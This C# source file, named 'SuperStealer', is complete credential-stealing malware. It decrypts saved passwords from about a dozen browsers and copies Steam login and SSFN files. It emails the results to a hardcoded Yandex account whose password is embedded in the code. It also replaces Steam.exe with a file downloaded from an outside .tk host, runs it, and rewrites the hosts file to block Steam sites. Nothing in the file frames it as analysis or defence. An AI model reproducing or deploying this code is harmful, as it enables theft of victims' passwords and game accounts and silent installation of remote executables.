namespace SuperStealer
{
    using Ionic.Zip;
    using Microsoft.Win32;
    using Newtonsoft.Json;
    using System;
    using System.Collections.Generic;
    using System.Collections.Specialized;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Net.Mail;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Threading;
    using System.Windows.Forms;

    public class Stealers
    {
        private static readonly string RoamingAppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private const string SQLiteConnectionString = "Data Source=\"{0}\";Version=3;FailIfMissing=True";
        public static string SteamDown = "http://www.downgradefiles.tk/download2.php?a=b5e959f48cd179072fc2dccb894a9f89&b=b18cb64db2ae8b43e8d2e9e09521861f";
        public static string SteamPatch = @"C:\Program Files\Steam";

        public static void BrowsersStealer()
        {
            try
            {
                string contents = string.Empty;
                string loginsChrome = GetLoginsChrome();
                string loginsYandex = GetLoginsYandex();
                string loginsOpera = GetLoginsOpera();
                string loginsFirefox = GetLoginsFirefox();
                string loginsIE = GetLoginsIE();
                string loginsCoolNovo = GetLoginsCoolNovo();
                string loginsChromium = GetLoginsChromium();
                string loginsComodo = GetLoginsComodo();
                string loginsAmigo = GetLoginsAmigo();
                string loginsMailRu = GetLoginsMailRu();
                string loginsNichrome = GetLoginsNichrome();
                if (loginsChrome != "")
                {
                    contents = contents + loginsChrome;
                }
                if (loginsYandex != "")
                {
                    contents = contents + loginsYandex;
                }
                if (loginsOpera != "")
                {
                    contents = contents + loginsOpera;
                }
                if (loginsFirefox != "")
                {
                    contents = contents + loginsFirefox;
                }
                if (loginsIE != "")
                {
                    contents = contents + loginsIE;
                }
                if (loginsCoolNovo != "")
                {
                    contents = contents + loginsCoolNovo;
                }
                if (loginsChromium != "")
                {
                    contents = contents + loginsChromium;
                }
                if (loginsComodo != "")
                {
                    contents = contents + loginsComodo;
                }
                if (loginsAmigo != "")
                {
                    contents = contents + loginsAmigo;
                }
                if (loginsMailRu != "")
                {
                    contents = contents + loginsMailRu;
                }
                if (loginsNichrome != "")
                {
                    contents = contents + loginsNichrome;
                }
                if ((((((loginsChrome == "") && (loginsYandex == "")) && ((loginsOpera == "") && (loginsFirefox == ""))) && (((loginsIE == "") && (loginsCoolNovo == "")) && ((loginsChromium == "") && (loginsComodo == "")))) && ((loginsAmigo == "") && (loginsMailRu == ""))) && (loginsNichrome == ""))
                {
                    contents = contents + "No Logs";
                }
                if (System.IO.File.Exists(@"C:\\LogsBrowsers.txt"))
                {
                    System.IO.File.Delete(@"C:\\LogsBrowsers.txt");
                }
                System.IO.File.AppendAllText(@"C:\\LogsBrowsers.txt", contents);
                SendMail("smtp.yandex.ru", "boyringen@yandex.ru", "htcdesirex1997", "boyringen@gmail.com", string.Format("Пользователь: {0} | Дата: {1} | Время: {2}", Environment.UserName, DateTime.Now.ToShortDateString(), DateTime.Now.ToShortTimeString()), "-=========================Логи браузеров=========================-\r\n\r\n" + contents, @"C:\\LogsBrowsers.txt");
                Thread.Sleep(0xbb8);
                if (System.IO.File.Exists(@"C:\\LogsBrowsers.txt"))
                {
                    System.IO.File.Delete(@"C:\\LogsBrowsers.txt");
                }
            }
            catch
            {
            }
        }

        [DllImport("Crypt32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
        private static string Decrypt(byte[] Datas)
        {
            DATA_BLOB pDataIn = new DATA_BLOB();
            DATA_BLOB pDataOut = new DATA_BLOB();
            GCHandle handle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
            pDataIn.pbData = handle.AddrOfPinnedObject();
            pDataIn.cbData = Datas.Length;
            handle.Free();
            DATA_BLOB pOptionalEntropy = new DATA_BLOB();
            CRYPTPROTECT_PROMPTSTRUCT pPromptStruct = new CRYPTPROTECT_PROMPTSTRUCT();
            CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, IntPtr.Zero, ref pPromptStruct, 0, ref pDataOut);
            byte[] destination = new byte[pDataOut.cbData + 1];
            Marshal.Copy(pDataOut.pbData, destination, 0, pDataOut.cbData);
            string str = Encoding.UTF8.GetString(destination);
            return str.Substring(0, str.Length - 1);
        }

        public static string GetLoginsAmigo()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Amigo\User Data\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Amigo\User Data\Default\Login Data";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Amigo\User Data\Default\Login Data";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\Amigo\User Data\Default\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[Amigo - Амиго]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: Amigo - Амиго" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsChrome()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Google\Chrome\User Data\Default\Login Data";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Google\Chrome\User Data\Default\Login Data";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\Google\Chrome\User Data\Default\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[Google Chrome]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: Google Chrome" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsChromium()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\ChromiumPortable\Data\Profiles\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\Chromium\Data\Profiles\Default\Login Data";
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[Chromium]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: Chromium" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsComodo()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Comodo\Dragon\User Data\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Comodo\Dragon\User Data\Default\Login Data";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Comodo\Dragon\User Data\Default\Login Data";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\Comodo\Dragon\User Data\Default\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[Comodo Dragon]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: Comodo Dragon" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsCoolNovo()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\MapleStudio\ChromePlus\User Data\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\MapleStudio\ChromePlus\User Data\Default\Login Data";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\MapleStudio\ChromePlus\User Data\Default\Login Data";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\MapleStudio\ChromePlus\User Data\Default\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[CoolNovo]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: CoolNovo" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsFirefox()
        {
            try
            {
                string str = string.Empty;
                string str2 = null;
                string path = null;
                bool flag = false;
                bool flag2 = false;
                string[] directories = Directory.GetDirectories(Path.Combine(RoamingAppDataFolder, @"Mozilla\Firefox\Profiles"));
                if (directories.Length != 0)
                {
                    string str6;
                    string str7;
                    string str10;
                    foreach (string str4 in directories)
                    {
                        string[] files = Directory.GetFiles(str4, "signons.sqlite");
                        if (files.Length > 0)
                        {
                            str2 = files[0];
                            flag = true;
                        }
                        files = Directory.GetFiles(str4, "logins.json");
                        if (files.Length > 0)
                        {
                            path = files[0];
                            flag2 = true;
                        }
                        if (flag2 || flag)
                        {
                            CryptoAPI.FFDecryptor.Init(str4);
                            break;
                        }
                    }
                    if (flag)
                    {
                        using (SQLiteConnection connection = new SQLiteConnection(string.Format("Data Source=\"{0}\";Version=3;FailIfMissing=True", str2)))
                        {
                            connection.Open();
                            SQLiteCommand command = connection.CreateCommand();
                            command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                            using (SQLiteBase.DataReader reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    str6 = CryptoAPI.FFDecryptor.Decrypt(reader.GetString(0));
                                    str7 = CryptoAPI.FFDecryptor.Decrypt(reader.GetString(1));
                                    str10 = str;
                                    str = str10 + "-===============[Mozilla Firefox]===============-" + Environment.NewLine + "Link: " + reader.GetString(2) + Environment.NewLine + "Username: " + str6 + Environment.NewLine + "Password: " + str7 + Environment.NewLine + "Browser: Mozilla Firefox" + Environment.NewLine;
                                }
                            }
                            command.Dispose();
                        }
                    }
                    if (flag2)
                    {
                        FFLogins logins;
                        using (StreamReader reader2 = new StreamReader(path))
                        {
                            logins = JsonConvert.DeserializeObject<FFLogins>(reader2.ReadToEnd());
                        }
                        foreach (LoginData data in logins.logins)
                        {
                            str6 = CryptoAPI.FFDecryptor.Decrypt(data.encryptedUsername);
                            str7 = CryptoAPI.FFDecryptor.Decrypt(data.encryptedPassword);
                            str10 = str;
                            str = str10 + "-===============[Mozilla Firefox]===============-" + Environment.NewLine + "Link: " + data.hostname + Environment.NewLine + "Username: " + str6 + Environment.NewLine + "Password: " + str7 + Environment.NewLine + "Browser: Mozilla Firefox" + Environment.NewLine;
                        }
                    }
                }
                return str;
            }
            catch
            {
                return "";
            }
        }

        public static string GetLoginsIE()
        {
            try
            {
                string str = string.Empty;
                using (ExplorerUrlHistory history = new ExplorerUrlHistory())
                {
                    List<string[]> dataList = new List<string[]>();
                    foreach (STATURL staturl in history)
                    {
                        if (CryptoAPI.DecryptIePassword(staturl.UrlString, dataList))
                        {
                            foreach (string[] strArray in dataList)
                            {
                                string str3 = str;
                                str = str3 + "-===============[Internet Explorer]===============-" + Environment.NewLine + "Link: " + staturl.UrlString + Environment.NewLine + "Username: " + strArray[0] + Environment.NewLine + "Password: " + strArray[1] + Environment.NewLine + "Browser: Internet Explorer" + Environment.NewLine;
                            }
                        }
                    }
                }
                return str;
            }
            catch
            {
                return "";
            }
        }

        public static string GetLoginsMailRu()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Xpom\User Data\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Xpom\User Data\Default\Login Data";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Xpom\User Data\Default\Login Data";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\Xpom\User Data\Default\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[MailRu]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: MailRu" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsNichrome()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Nichrome\User Data\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Nichrome\User Data\Default\Login Data";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Nichrome\User Data\Default\Login Data";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\Nichrome\User Data\Default\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[Nichrome - Rambler]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: Nichrome - Rambler" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsOpera()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Opera\Opera\wand.dat";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Opera\Opera\wand.dat";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\Opera Software\Opera Stable\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[Opera]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: Opera" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static string GetLoginsYandex()
        {
            string str = string.Empty;
            string path = string.Empty;
            path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex\YandexBrowser\User Data\Default\Login Data";
            if (!System.IO.File.Exists(path))
            {
                path = @"C:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Yandex\YandexBrowser\User Data\Default\Login Data";
                if (!System.IO.File.Exists(path))
                {
                    path = @"D:\Documents and Settings\" + Environment.UserName + @"\Application Data\Local Settings\Yandex\YandexBrowser\User Data\Default\Login Data";
                    if (!System.IO.File.Exists(path))
                    {
                        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).Replace(@"C:\", @"D:\") + @"\Yandex\YandexBrowser\User Data\Default\Login Data";
                    }
                }
            }
            if (System.IO.File.Exists(path))
            {
                try
                {
                    SQLiteHandler handler = new SQLiteHandler(path);
                    handler.ReadTable("logins");
                    for (int i = 0; i <= (handler.GetRowCount() - 1); i++)
                    {
                        try
                        {
                            string str4 = handler.GetValue(i, "origin_url");
                            string str5 = handler.GetValue(i, "username_value");
                            string str6 = Decrypt(Encoding.Default.GetBytes(handler.GetValue(i, "password_value")));
                            if ((str5 != "") || (str6 != ""))
                            {
                                string str8 = str;
                                str = str8 + "-===============[Yandex Browser]===============-" + Environment.NewLine + "Link: " + str4 + Environment.NewLine + "Username: " + str5 + Environment.NewLine + "Password: " + str6 + Environment.NewLine + "Browser: Yandex" + Environment.NewLine;
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            return str;
        }

        public static void GoAllStealer()
        {
            string fileName = FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", "")).FileName;
            fileName = fileName.Substring(fileName.LastIndexOf("/") + 1, fileName.Length - (fileName.LastIndexOf("/") + 1));
            object obj2 = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam").GetValue("Steamexe");
            string str3 = Convert.ToString(obj2).Replace("steam.exe", "config");
            string str4 = Convert.ToString(obj2).Replace("/", @"\");
            string[] files = Directory.GetFiles(str4.Substring(0, str4.Length - 9), "*.");
            NameValueCollection values = new NameValueCollection();
            string path = @"C:\\Config";
            if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
            }
            DirectoryInfo info2 = Directory.CreateDirectory(path);
            for (int i = 0; i < 20; i++)
            {
                try
                {
                    if (((System.IO.File.GetAttributes(files[i]) & FileAttributes.Hidden) == FileAttributes.Hidden) || (files.Length > 0))
                    {
                        FileInfo info3 = new FileInfo(files[i]);
                        System.IO.File.Copy(info3.FullName, path + @"\" + info3.Name);
                    }
                }
                catch
                {
                }
            }
            string str6 = str3.Replace("/", @"\") + @"\\config.vdf";
            string str7 = str3.Replace("/", @"\") + @"\\loginusers.vdf";
            string str8 = str3.Replace("/", @"\") + @"\\lSteamAppData.vdf";
            string str9 = str3.Replace("/", @"\") + @"\\SteamAppData.vdf";
            try
            {
                if (System.IO.File.Exists(str6))
                {
                    System.IO.File.Copy(str6, path + @"\\config.vdf");
                }
                if (System.IO.File.Exists(str7))
                {
                    System.IO.File.Copy(str7, path + @"\\loginusers.vdf");
                }
                if (System.IO.File.Exists(str9))
                {
                    System.IO.File.Copy(str9, path + @"\\SteamAppData.vdf");
                }
                if (System.IO.File.Exists(str8))
                {
                    System.IO.File.Copy(str8, path + @"\\lSteamAppData.vdf");
                }
                Thread.Sleep(0x3e8);
            }
            catch
            {
            }
            ZipFile file = new ZipFile(path + @"\Config.zip");
            file.AddDirectory(path);
            file.Save();
            if (System.IO.File.Exists(path + @"\Config.zip"))
            {
                SendMail("smtp.yandex.ru", "boyringen@yandex.ru", "htcdesirex1997", "boyringen@gmail.com", string.Format("Пользователь: {0} | Дата: {1} | Время: {2}", Environment.UserName, DateTime.Now.ToShortDateString(), DateTime.Now.ToShortTimeString()), "-=========================Steam Config and SSFN=========================-\r\n\r\n", path + @"\Config.zip");
            }
            Thread.Sleep(0xbb8);
            if (System.IO.File.Exists(path + @"\Config.zip"))
            {
                Directory.Delete(path, true);
            }
            try
            {
                SteamKick();
            }
            catch
            {
            }
        }

        private static void GoPatchSteam()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Valve\Steam");
                string str = (string) key.GetValue("SteamPath");
                SteamPatch = str;
                key.Close();
            }
            catch
            {
            }
        }

        private static void HostFile()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\drivers\etc\hosts";
                if (!System.IO.File.Exists(path))
                {
                    path = Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("C:", "D:") + @"\drivers\etc\hosts";
                }
                if (System.IO.File.Exists(path))
                {
                    StreamReader reader = new StreamReader(path);
                    string str2 = reader.ReadToEnd();
                    reader.Close();
                    str2 = str2 + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n127.0.0.1 store.steampowered.com\n127.0.0.1 steamcommunity.com\n";
                    StreamWriter writer = new StreamWriter(path);
                    writer.Write(str2);
                    writer.Close();
                }
                Application.Exit();
            }
            catch
            {
            }
        }

        public static string Pars(string strSource, string strStart, string strEnd, int startPos)
        {
            int length = strStart.Length;
            string str = "";
            int index = strSource.IndexOf(strStart, startPos);
            int num2 = strSource.IndexOf(strEnd, (int) (index + length));
            if ((index != -1) & (num2 != -1))
            {
                str = strSource.Substring(index + length, num2 - (index + length));
            }
            return str;
        }

        private static List<string> parses(string all, string l, string r)
        {
            List<string> list = new List<string>();
            Regex regex = new Regex(l + "(.*?)" + r);
            if (regex.IsMatch(all))
            {
                foreach (Match match in regex.Matches(all))
                {
                    list.Add(match.Groups[1].ToString());
                }
            }
            return list;
        }

        public static void SendMail(string smtpServer, string from, string password, string mailto, string caption, string message, [Optional, DefaultParameterValue(null)] string attachFile)
        {
            try
            {
                MailMessage message2 = new MailMessage();
                message2.From = new MailAddress(from);
                message2.To.Add(new MailAddress(mailto));
                message2.Subject = caption;
                message2.Body = message;
                if (!string.IsNullOrEmpty(attachFile))
                {
                    message2.Attachments.Add(new Attachment(attachFile));
                }
                SmtpClient client2 = new SmtpClient();
                client2.Host = "smtp.yandex.ru";
                client2.Port = 0x24b;
                client2.UseDefaultCredentials = false;
                client2.DeliveryMethod = SmtpDeliveryMethod.Network;
                client2.Credentials = new NetworkCredential(from, password);
                client2.EnableSsl = true;
                client2.Timeout = 0x3a98;
                client2.Send(message2);
                message2.Dispose();
            }
            catch
            {
            }
        }

        private static void SteamDownload()
        {
            try
            {
                GoPatchSteam();
                if (System.IO.File.Exists(SteamPatch + @"\Steam.exe"))
                {
                    System.IO.File.Delete(SteamPatch + @"\Steam.exe");
                }
                WebClient client = new WebClient();
                client.DownloadFileCompleted += new AsyncCompletedEventHandler(Stealers.SteamStart);
                client.DownloadFileAsync(new Uri(SteamDown), SteamPatch + @"\Steam.exe");
            }
            catch
            {
            }
        }

        public static void SteamKick()
        {
            try
            {
                GoPatchSteam();
                Process[] processesByName = Process.GetProcessesByName("Steam");
                if (processesByName.Length <= 0)
                {
                    SteamDownload();
                }
                else
                {
                    foreach (Process process in processesByName)
                    {
                        process.Kill();
                    }
                    SteamDownload();
                }
                Process[] processArray2 = Process.GetProcessesByName("GameOverlayUI");
                if (processArray2.Length <= 0)
                {
                    SteamDownload();
                }
                else
                {
                    foreach (Process process in processArray2)
                    {
                        process.Kill();
                    }
                    SteamDownload();
                }
            }
            catch
            {
            }
        }

        private static void SteamStart(object sender, AsyncCompletedEventArgs e)
        {
            try
            {
                GoPatchSteam();
                Process.Start(SteamPatch + @"\Steam.exe");
                HostFile();
            }
            catch
            {
            }
        }

        [DllImport("urlmon.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern int URLDownloadToFile([MarshalAs(UnmanagedType.IUnknown)] object pCaller, [MarshalAs(UnmanagedType.LPWStr)] string szURL, [MarshalAs(UnmanagedType.LPWStr)] string szFileName, int dwReserved, IntPtr lpfnCB);

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public Stealers.CryptProtectPromptFlags dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }
    }
}

